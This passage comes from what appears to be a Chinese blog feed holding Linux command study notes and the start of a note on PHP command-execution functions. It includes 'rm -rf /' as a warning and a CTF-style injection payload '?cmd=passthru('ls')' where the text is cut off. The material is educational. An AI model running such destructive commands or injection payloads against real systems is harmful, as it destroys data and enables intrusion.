参数2</code></strong></p><ul><li><strong>-r选项，可选，用于复制文件夹使用，表示递归</strong></li><li><strong>参数1，Linux路径，表示被复制的文件或文件夹</strong></li><li><strong>参数2，Linux路径，表示要复制去的地方</strong></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cp test<span class="hljs-selector-class">.txt</span> test2<span class="hljs-selector-class">.txt</span><br>cp test<span class="hljs-selector-class">.txt</span> ./test2<span class="hljs-selector-class">.txt</span><br>cp test<span class="hljs-selector-class">.txt</span> /home/itheima/test2<span class="hljs-selector-class">.txt</span><br><br>复制文件夹<br>cp -<span class="hljs-attribute">r</span> itheima itheima2<br></code></pre></td></tr></table></figure><h3 id="mv（移动文件或文件夹）"><a href="#mv（移动文件或文件夹）" class="headerlink" title="mv（移动文件或文件夹）"></a>mv（移动文件或文件夹）</h3><p><strong>mv命令可以用于移动文件\文件夹</strong></p><p><strong>mv命令：move</strong></p><p><strong>语法：<code>mv 参数1 参数2</code></strong></p><ul><li>参数1，Linux路径，表示被移动的文件或文件夹</li><li>参数2，Linux路径，表示要移动去的地方，如果目标不存在，则进行改名，确保目标存在</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">移动文件<br><span class="hljs-built_in">mv</span> test.txt Desktop/<br><br>改名<br><span class="hljs-built_in">mv</span> test2.txt test3.txt<br><br>文件夹的移动<br><span class="hljs-built_in">mv</span> <span class="hljs-built_in">test</span> Desktop/<br></code></pre></td></tr></table></figure><h3 id="rm（删除文件、文件夹）"><a href="#rm（删除文件、文件夹）" class="headerlink" title="rm（删除文件、文件夹）"></a>rm（删除文件、文件夹）</h3><p><strong>rm命令可用于删除文件、文件夹</strong></p><p>rm命令：remove</p><p><strong>语法：<code>rm [-r -f] 参数1 参数2 ...... 参数N</code></strong></p><ul><li><p>同cp命令一样，-r选项用于删除文件夹</p></li><li><p>-f表示force，强制删除（不会弹出提示确认信息）</p><ul><li><p>普通用户删除内容不会弹出提示，只有root管理员用户删除内容会有提示</p></li><li><p>所以一般普通用户用不到-f选项</p></li><li><p>演示强制删除，-f选项</p><p>可以通过su - root，并输入密码临时切换到root用户体验</p><p>通过输入exit命令，退回普通用户</p></li></ul></li><li><p>参数1、参数2、……、参数N表示要删除的文件或文件夹路径，安装空格隔开</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">删除文件<br><span class="hljs-built_in">rm</span> test3.txt<br><br>删除文件夹<br><span class="hljs-built_in">rm</span> -r test2<br><br>多个文件夹的删除<br><span class="hljs-built_in">rm</span> -r test2 test3 test4 itheima<br></code></pre></td></tr></table></figure><h4 id="rm删除文件、文件夹-通配符"><a href="#rm删除文件、文件夹-通配符" class="headerlink" title="rm删除文件、文件夹-通配符"></a>rm删除文件、文件夹-通配符</h4><p>rm命令支持通配符*，用来做模糊匹配</p><ul><li>符号*表示通配符，即匹配任意内容（包含空），示例：</li><li>test*,表示匹配任何以test开头的内容</li><li>*test，表示匹配任何以test结尾的内容</li><li>*test*，表示匹配任何包含test的内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">演示：<br>删除所有以<span class="hljs-built_in">test</span>开头的文件或文件夹<br><span class="hljs-built_in">rm</span> -r <span class="hljs-built_in">test</span>*<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><p><strong>rm -rf &#x2F;</strong></p><p><strong>rm -rf &#x2F;</strong>*</p><p><strong>等同于格式化</strong></p><h2 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h2><h3 id="which（查找命令的程序文件）"><a href="#which（查找命令的程序文件）" class="headerlink" title="which（查找命令的程序文件）"></a>which（查找命令的程序文件）</h3><p><strong>语法：<code>which 要查找的命令</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> <span class="hljs-built_in">cd</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">touch</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">mkdir</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">cp</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h3 id="find（按文件名查找文件）"><a href="#find（按文件名查找文件）" class="headerlink" title="find（按文件名查找文件）"></a>find（按文件名查找文件）</h3><p>在Linux系统中，可以通过find命令去搜索指定的文件</p><p>语法：<code>find 起始路径 -name &quot;被查找文件名&quot;</code></p><p>-name表示以文件名搜索</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><h4 id="find命令-通配符"><a href="#find命令-通配符" class="headerlink" title="find命令-通配符"></a>find命令-通配符</h4><p>被查找文件名，支持使用通配符*来做模糊匹配</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;test*&quot;</span><br><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*test&quot;</span><br><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*test*&quot;</span><br></code></pre></td></tr></table></figure><h4 id="find命令-按文件大小查找文件"><a href="#find命令-按文件大小查找文件" class="headerlink" title="find命令-按文件大小查找文件"></a>find命令-按文件大小查找文件</h4><p>语法：find 起始路径 -size +|- n [kMG]</p><ul><li>+、-表示大于和小于</li><li>n表示大小数字</li><li>KMG表示大小单位，k（小写字母）表示kb，M表示MB，G表示GB</li></ul><p>示例：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">查找小于<span class="hljs-number">10</span>KB的文件：find / -size <span class="hljs-number">-10</span>k<br>查找大于<span class="hljs-number">100</span>MB的文件：find / -size <span class="hljs-number">+100</span>M<br>查找大于<span class="hljs-number">1</span>GB的文件：find / -size <span class="hljs-number">+1</span>G<br></code></pre></td></tr></table></figure><h2 id="grep、wc和管道符"><a href="#grep、wc和管道符" class="headerlink" title="grep、wc和管道符"></a>grep、wc和管道符</h2><h3 id="grep命令（过滤文件内容）"><a href="#grep命令（过滤文件内容）" class="headerlink" title="grep命令（过滤文件内容）"></a>grep命令（过滤文件内容）</h3><p><strong>可以通过grep命令，从文件中通过关键字过滤文件行。</strong></p><p><strong>语法：<code>grep [-n] 关键字 文件路径</code></strong></p><ul><li><strong>选项-n，可选，表示在结果中显示匹配的行的行号</strong></li><li><strong>参数，关键字，必填，表示过滤的关键字，带有空格或其他特殊符号，建议使用” “将关键字包围起来</strong></li><li><strong>参数，文件路径，必填，表示要过滤的内容的文件路径，可作为内容输入端口</strong></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">grep <span class="hljs-string">&quot;itheima&quot;</span> <span class="hljs-keyword">test</span>.txt<br></code></pre></td></tr></table></figure><h3 id="wc命令（做数量统计）"><a href="#wc命令（做数量统计）" class="headerlink" title="wc命令（做数量统计）"></a>wc命令（做数量统计）</h3><p><strong>可以通过wc命令统计文件的行数、单词数量等</strong></p><p><strong>语法：<code>wc [-c -m -l -w] 文件路径</code></strong></p><ul><li><strong>选项，-c，统计bytes数量</strong></li><li><strong>选项，-m，统计字符数量</strong></li><li><strong>选项，-l，统计行数</strong></li><li><strong>选项，-w，统计单词数量</strong></li><li><strong>参数，文件路径，被统计的文件，可作为内容输入端口</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">wc</span> test.txt<br></code></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p><strong>管道符：|</strong></p><p><strong>管道符的含义是：将管道符左边命令的结果，作为右边命令的输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test.txt | grep itheima<br><span class="hljs-built_in">cat</span> test.txt | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-built_in">ls</span> | grep <span class="hljs-built_in">test</span><br><span class="hljs-built_in">ls</span> /usr/bin | grep gtf<br><span class="hljs-built_in">ls</span> -l /usr/bin | grep gtf<br><span class="hljs-built_in">ls</span> -l /usr/bin | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><h2 id="echo、tail和重定向符"><a href="#echo、tail和重定向符" class="headerlink" title="echo、tail和重定向符"></a>echo、tail和重定向符</h2><h3 id="echo命令（输出内容）"><a href="#echo命令（输出内容）" class="headerlink" title="echo命令（输出内容）"></a>echo命令（输出内容）</h3><p><strong>可以使用echo命令在命令行内输出指定内容</strong></p><p><strong>语法：<code>echo 输出的内容</code></strong></p><ul><li><strong>无需选项，只有一个参数，表示要输出的内容，复杂内容可以用” “包围</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello linux&quot;</span><br></code></pre></td></tr></table></figure><h3 id="反引号-（将字符当做命令执行）"><a href="#反引号-（将字符当做命令执行）" class="headerlink" title="反引号&#96;（将字符当做命令执行）"></a>反引号&#96;（将字符当做命令执行）</h3><p><strong>我们可以通过将命令用反引号`将其包围，被`包围的内容，会被作为命令执行，而非普通字符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">pwd</span>会输出<span class="hljs-built_in">pwd</span>因为这里不会将<span class="hljs-built_in">pwd</span>当做命令执行，而是普通字符<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>`<br></code></pre></td></tr></table></figure><h3 id="重定向符（写入和追加内容到文件）"><a href="#重定向符（写入和追加内容到文件）" class="headerlink" title="重定向符（写入和追加内容到文件）"></a>重定向符（写入和追加内容到文件）</h3><p><strong>重定向符：&gt;和&gt;&gt;</strong></p><ul><li><strong>&gt;,将左侧命令的结果，覆盖写入到符号右侧指定的文件中</strong></li><li><strong>&gt;&gt;，将左侧命令的结果，追加写入到符号右侧指定的文件中</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello Linux&quot;</span> &gt; itheima.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello itheima&quot;</span> &gt; itheima.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello itcast&quot;</span> &gt;&gt; itheima.txt<br></code></pre></td></tr></table></figure><h3 id="tail命令（查看文件尾部内容）"><a href="#tail命令（查看文件尾部内容）" class="headerlink" title="tail命令（查看文件尾部内容）"></a>tail命令（查看文件尾部内容）</h3><p>使用tail命令，可以查看文件尾部内容，跟踪文件的最新更改，语法如下：</p><p><strong><code>tail [-f -num] Linux路径</code></strong></p><ul><li>参数，Linux路径，表示被跟踪的文件路径</li><li>选项，-f，表示持续跟踪（跟踪文件更改）</li><li>选项，-num，表示查看尾部多少行，不填默认10行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> test.txt<br><span class="hljs-built_in">tail</span> -5 test.txt<br><span class="hljs-built_in">tail</span> -20 test.txt<br></code></pre></td></tr></table></figure><h2 id="vi编辑器"><a href="#vi编辑器" class="headerlink" title="vi编辑器"></a>vi编辑器</h2><h3 id="vi-vim编辑器介绍："><a href="#vi-vim编辑器介绍：" class="headerlink" title="vi\vim编辑器介绍："></a>vi\vim编辑器介绍：</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-5.png"></p><h3 id="vi-vim编辑器的三种工作模式"><a href="#vi-vim编辑器的三种工作模式" class="headerlink" title="vi\vim编辑器的三种工作模式"></a>vi\vim编辑器的三种工作模式</h3><p><strong>命令模式：</strong></p><p>​<strong>命令模式下，所敲的按键编辑器都理解为命令，以命令驱动执行不同的功能</strong></p><p>​<strong>此模式下，不能自由进行文本编辑</strong></p><p><strong>输入模式：</strong></p><p>​<strong>也就是所谓的编辑模式、插入模式。</strong></p><p>​<strong>此模式下，可以对文件内容进行自由编辑</strong></p><p><strong>底线命令模式</strong></p><p>​<strong>以：开始，通常用于文件的保存、退出</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-6.png"></p><h3 id="命令模式快捷键"><a href="#命令模式快捷键" class="headerlink" title="命令模式快捷键"></a>命令模式快捷键</h3><p>命令模式下常见快捷键</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-7.png"></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-8.png"></p><h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-9.png"></p><h1 id="Linux用户和权限"><a href="#Linux用户和权限" class="headerlink" title="Linux用户和权限"></a>Linux用户和权限</h1><h2 id="Linux的root用户"><a href="#Linux的root用户" class="headerlink" title="Linux的root用户"></a>Linux的root用户</h2><p><strong>root用户（超级管理员）</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-10.png"></p><p>root用户拥有最大的系统操作权限，而普通用户在许多地方的权限是受限的。</p><p>例如：使用普通用户无法在根目录下创建文件，root用户可以</p><ul><li>普通用户的权限，一般在其HOME目录内是不受限的、</li><li>一旦出了HOME目录，大多数地方，普通用户仅有只读和执行权限，无修改权限</li></ul><h3 id="su和exit命令（切换用户）"><a href="#su和exit命令（切换用户）" class="headerlink" title="su和exit命令（切换用户）"></a>su和exit命令（切换用户）</h3><p>su命令就是用于账户切换的系统命令，su：Switch User</p><p><strong>语法：<code>su [-] [用户名]</code></strong></p><ul><li>-符号是可选的，表示是否在切换用户后加载环境变量（建议带上）</li><li>参数：用户名，表示要切换的用户，用户名可以省略，省略表示切换到root</li><li>切换用户后，可以通过exit命令退回上一个用户，也可以使用快捷键：ctrl+d</li></ul><p>使用普通用户，切换到其他用户需要输入密码，如切换到root用户</p><p>使用root用户切换到其他用户，无需密码，可以直接切换</p><h3 id="sudo命令（临时获得root权限执行命令）"><a href="#sudo命令（临时获得root权限执行命令）" class="headerlink" title="sudo命令（临时获得root权限执行命令）"></a>sudo命令（临时获得root权限执行命令）</h3><p>可以使用sudo命令，为普通的命令授权，临时以root身份执行</p><p><strong>语法：<code>sudo 其他命令</code></strong></p><ul><li>在其他命令之前，带上sudo，即可为这一条命令临时赋予root授权</li><li>但是并不是所有的用户，都有权利使用sudo，我们需要为普通用户配置sudo认证</li></ul><p>配置sudo认证</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-11.png"></p><h2 id="用户、用户组管理"><a href="#用户、用户组管理" class="headerlink" title="用户、用户组管理"></a>用户、用户组管理</h2><h3 id="用户、用户组"><a href="#用户、用户组" class="headerlink" title="用户、用户组"></a>用户、用户组</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-12.png"></p><h3 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h3><p><strong>以下命令需root用户执行</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">创建用户组<br>groupadd 用户组名<br><br>删除用户组<br>groupdel 用户组名<br></code></pre></td></tr></table></figure><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p>以下命令需root用户执行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">创建用户<br>useradd <span class="hljs-selector-attr">[-g -d]</span> 用户名<br>选项：-<span class="hljs-selector-tag">g</span>指定用户的组，不指定-<span class="hljs-selector-tag">g</span>，会创建同名组并自动加入，指定-<span class="hljs-selector-tag">g</span>需要组已经存在，如已存在同名组，必需使用-<span class="hljs-selector-tag">g</span><br>选项：-d指定用户HOME路径，不指定，HOME目录默认在：/home/用户名<br><br>删除用户<br>userdel <span class="hljs-selector-attr">[-r]</span> 用户名<br>选项：-<span class="hljs-attribute">r</span>，删除用户的HOME目录，不使用-<span class="hljs-attribute">r</span>，删除用户时，HOME目录保留<br><br>查看用户所属组<br>id <span class="hljs-selector-attr">[用户名]</span><br>参数：用户名，被查看的用户，如果不提供则查看自身<br><br>修改用户所属组<br>usermod -aG 用户组 用户名<br>将指定用户加入指定的用户组<br></code></pre></td></tr></table></figure><h3 id="getent（查看当前系统中有哪些用户）"><a href="#getent（查看当前系统中有哪些用户）" class="headerlink" title="getent（查看当前系统中有哪些用户）"></a>getent（查看当前系统中有哪些用户）</h3><p><strong>使用getent命令，可以查看当前系统中有哪些用户</strong></p><p><strong>语法：<code>getent passwd</code></strong></p><p>共有7份信息，分别是：</p><p>用户名：密码（x）：用户ID：组ID：描述信息（无用）：HOME目录：执行终端（默认bash）</p><p><strong>使用getent命令，同样可以查看当前系统中有哪些用户组</strong></p><p><strong>语法：<code>getent group</code></strong></p><p>包含3份信息：</p><p>组名称：组认证（显示为x）：组ID</p><h2 id="查看权限控制"><a href="#查看权限控制" class="headerlink" title="查看权限控制"></a>查看权限控制</h2><h3 id="认知权限信息"><a href="#认知权限信息" class="headerlink" title="认知权限信息"></a>认知权限信息</h3><p>通过ls -l可以以列表形式查看内容，并显示权限细节</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-13.png"></p><p><strong>权限细节：</strong><br><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-14.png"></p><p><strong>rwx</strong></p><ul><li>r表示读权限</li><li>w表示写权限</li><li>x表示执行权限</li></ul><p><strong>针对文件、文件夹的不同，rwx的含义有细微差别</strong></p><p>r，针对文件可以查看文件内容</p><p>​针对文件夹，可以查看文件夹内容，如ls命令</p><p>w，针对文件表示可以修改此文件</p><p>​针对文件夹，可以在文件夹内：创建、删除、改名等操作</p><p>x，针对文件表示可以将文件作为程序执行</p><p>​针对文件夹，表示可以更改工作目录到此文件夹，即cd进入</p><h2 id="修改权限控制-chmod"><a href="#修改权限控制-chmod" class="headerlink" title="修改权限控制 - chmod"></a>修改权限控制 - chmod</h2><h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>我们可以使用chmod命令，修改文件、文件夹的权限信息。</p><p><strong>注意：只有文件、文件夹的所属用户或root用户可以修改</strong></p><p><strong>语法：<code>chmod [-R] 权限 文件或文件夹</code></strong></p><p><strong>选项：-R，对文件夹内的全部内容应用同样的操作</strong></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">chmod u=rwx,g=rx,o=<span class="hljs-variable language_">x</span> hello.txt，将文件权限修改为：rwxr-<span class="hljs-variable language_">x</span>--<span class="hljs-variable language_">x</span><br>其中：u表示user所属用户权限，g表示group组权限，o表示<span class="hljs-symbol">other</span>其他用户权限<br><br>chmod -R u=rwx,g=rx,o=<span class="hljs-variable language_">x</span> test，将文件夹test以及文件夹内全部内容权限设置为：rwxr-<span class="hljs-variable language_">x</span>--<span class="hljs-variable language_">x</span><br></code></pre></td></tr></table></figure><h3 id="权限的数字序号"><a href="#权限的数字序号" class="headerlink" title="权限的数字序号"></a>权限的数字序号</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-15.png"></p><h2 id="修改权限控制-chown"><a href="#修改权限控制-chown" class="headerlink" title="修改权限控制 - chown"></a>修改权限控制 - chown</h2><h3 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h3><p>使用chown命令，可以修改文件、文件夹的所属用户和用户组</p><p><strong>注意：普通用户无法修改所属为其它用户或组，所以此命令只适用于root用户执行</strong></p><p><strong>语法：<code>chown [-R] [用户] [:] [用户组] 文件或文件夹</code></strong></p><ul><li><strong>选项，-R，同chmod，对文件夹内全部内容应用相同规则</strong></li><li><strong>选项，用户，修改所属用户</strong></li><li><strong>选项，用户组，修改所属用户组</strong></li><li><strong>:用于分隔用户和用户组</strong></li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">chown<span class="hljs-built_in"> root</span> hello.txt，将hello.txt所属用户修改<span class="hljs-built_in">为root</span><br>chown :root hello.txt，将hello.txt所属用户组修改<span class="hljs-built_in">为root</span><br>chown<span class="hljs-built_in"> root</span>:itheima hello.txt，将hello.txt所属用户修改<span class="hljs-built_in">为root</span>，所属组修改为itheima<br>chown -R<span class="hljs-built_in"> root</span> test，将文件夹test的所属用于修改<span class="hljs-built_in">为root</span>并对文件夹内全部内容应用同样规则<br></code></pre></td></tr></table></figure><h1 id="Linux实用操作"><a href="#Linux实用操作" class="headerlink" title="Linux实用操作"></a>Linux实用操作</h1><h2 id="各类小技巧（快捷键）"><a href="#各类小技巧（快捷键）" class="headerlink" title="各类小技巧（快捷键）"></a>各类小技巧（快捷键）</h2><p>常用快捷键</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css">ctrl + c强制停止<br>ctrl + d退出或登出<br><br>历史命令搜索<br>history查看历史输入过的命令<br>!自动执行上一次匹配前缀的命令<br>ctrl + <span class="hljs-attribute">r</span>输入内容去匹配历史命令回车执行，键盘左右键得到此命令但不执行<br><br>光标移动快捷键<br>ctrl + <span class="hljs-selector-tag">a</span>跳到命令开头<br>ctrl + e跳到命令结尾<br>ctrl + 键盘左键向左跳一个单词<br>ctrl + 键盘右键向右跳一个单词<br><br>清屏<br>ctrl + l清空终端内容<br><span class="hljs-attribute">clear</span>清屏<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>system(string $command,int $return_var&#x3D;?)</p><p>常用参数：</p><p>command参数：执行command参数所指定的命令，并且输出执行结果</p><p>如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>能够直接回显结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec(string $command,array &amp;$output&#x3D;?,int &amp;$return_var&#x3D;?)</p><p>command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显（如果需要显示所有内容要定义一个数组），直接用echo只会回显最后一行</p><p>output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组。</p><p>需要借用print_r或者var_dump来输出结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>passthru(string $command,int &amp;$return_var&#x3D;?)</p><p>command参数：要执行的命令</p><p>输出二进制数据，并且需要直接传送到浏览器。</p><p>直接回显结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p>shell_exec(string $cmd)</p><p>cmd参数：要执行的命令</p><p>环境执行命令，并且将完整的输出以字符串的方式返回。功能等同于反引号</p><p>借用echo、print等输出结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>反引号`要执行的命令`（反引号&#96;在键盘左上角~号下面）</p><p>反引号能够执行程序指令</p><p>不能直接回显，需要使用echo&#x2F;print来输出</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p><h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><p>popen(string $command,string $mode)</p><p>command参数：要执行的命令。</p><p>mode参数：模式。’r’表示读取，’w’表示写入。</p><p>fgets获取内容-&gt;print_r输出内容</p><p>需要先fgets或者fread获取popen()的内容，然后再用echo或print_r输出</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</p><p>command参数：要执行的命令</p><p>descriptor_spec参数：定义数组内容</p><p>pipes参数：调用数组内容</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p>pcntl_exec(string $path,array $args&#x3D;?,array $envs&#x3D;?)</p><p>pathpath必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）</p><p>args是一个要传递给程序的参数的字符串数组</p><p>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key&#x3D;&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p><strong>在当前进程空间执行指定程序</strong></p><h3 id="补充：assert和eval"><a href="#补充：assert和eval" class="headerlink" title="补充：assert和eval"></a>补充：assert和eval</h3><p>eval定义和用法：<br>1.eval会把字符串当作PHP代码来执行<br>2.eval语法非常严格，所有的要执行的php字符串都必须完整，且以分号结尾<br>3.如果字符串中带有return，会立刻终止执行并返回NULL<br>4.如果代码中存在解析错误，则 eval() 函数返回 false</p><p>assert的定义与用法：<br>1.assert会把字符串当作PHP代码来执行<br>2.assert被认定为一个可变函数</p><p>详细说明：<a href="https://blog.csdn.net/senng/article/details/125961095">https://blog.csdn.net/senng/article/details/125961095</a></p><h2 id="替换绕过函数绕过"><a href="#替换绕过函数绕过" class="headerlink" title="替换绕过函数绕过"></a>替换绕过函数绕过</h2><p>其实就是一个例题</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p><p>发现没有过滤passthru，直接构造payload</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;ls&#x27;</span>)查看目录</span><br>或者<br>?<span 